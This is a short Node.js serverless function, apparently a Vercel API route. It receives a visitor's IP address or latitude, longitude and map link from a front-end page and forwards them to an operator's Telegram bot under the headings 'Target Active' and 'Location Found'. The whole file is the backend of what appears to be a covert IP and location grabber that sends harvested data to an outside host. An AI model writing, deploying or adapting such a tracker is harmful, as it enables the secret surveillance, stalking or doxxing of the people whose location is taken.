const fetch = require('node-fetch');

export default async function handler(req, res) {
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    // Vercel Environment Variables se data uthayega
    const TOKEN = process.env.BOT_TOKEN;
    const CHAT_ID = process.env.CHAT_ID;

    const data = req.body;
    let message = "";

    if (data.type === 'IP') {
        message = `🌐 *Target Active*\nIP: \`${data.val}\`\nDate: 30 April 2026`;
    } else if (data.type === 'LOC') {
        message = `📍 *Location Found*\nLat: \`${data.lat}\`\nLon: \`${data.lon}\`\n🔗 [Google Maps](${data.map})`;
    }

    try {
        const url = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
        await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: "Markdown"
            })
        });
        return res.status(200).json({ success: true });
    } catch (error) {
        return res.status(500).json({ error: 'Telegram API Error' });
    }
}
